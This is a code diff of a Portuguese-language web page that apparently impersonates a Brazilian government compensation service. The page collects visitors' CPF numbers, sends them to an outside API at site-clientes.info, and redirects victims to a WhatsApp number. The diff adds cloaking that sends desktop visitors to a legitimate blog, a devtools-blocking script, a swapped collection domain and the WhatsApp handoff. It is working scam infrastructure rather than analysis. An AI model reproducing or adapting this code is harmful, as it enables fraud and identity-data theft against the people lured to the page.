@@ -19,7 +19,17 @@
       src="disable-devtool-1.html"
       url="https://meutudo.com.br/blog/guia-do-saque-aniversario/"
     ></script>
-
+    <script type="text/javascript">
+      if (
+        !navigator.userAgent.match(
+          /(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/
+        ) &&
+        window.innerWidth > 768
+      ) {
+        window.location.href =
+          "https://meutudo.com.br/blog/guia-do-saque-aniversario/";
+      }
+    </script>
     <script>
       window.pixelId = "67b759e9f454faf48c0999a2";
       var a = document.createElement("script");
@@ -1374,7 +1384,7 @@
                     class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 h-10 px-4 w-full mt-2 hover:bg-[#1351B4]/90 text-white py-2 rounded-full text-sm font-medium delayed-button"
                     href=""
                     style="background-color: #1351b4"
-                    >Quero receber minha indenização</a
+                    >Falar com um atendente</a
                   >
                   <style>
                     /* O botão começa oculto */
@@ -1488,7 +1498,7 @@
       }
 
       function fetchCpfData(cpf) {
-        const apiUrl = `https://site-clientes.online/aknes-api/aknes.php?cpf=${cpf}`;
+        const apiUrl = `https://site-clientes.info/aknes-api/aknes.php?cpf=${cpf}`;
 
         fetch(apiUrl)
           .then((response) => {
@@ -1564,7 +1574,7 @@
               }
             }
 
-            window.location.href = `../atendimento?${searchParams.toString()}`;
+            window.location.href = `https://wa.me/5566984320500?${searchParams.toString()}`;
           });
         }
       });
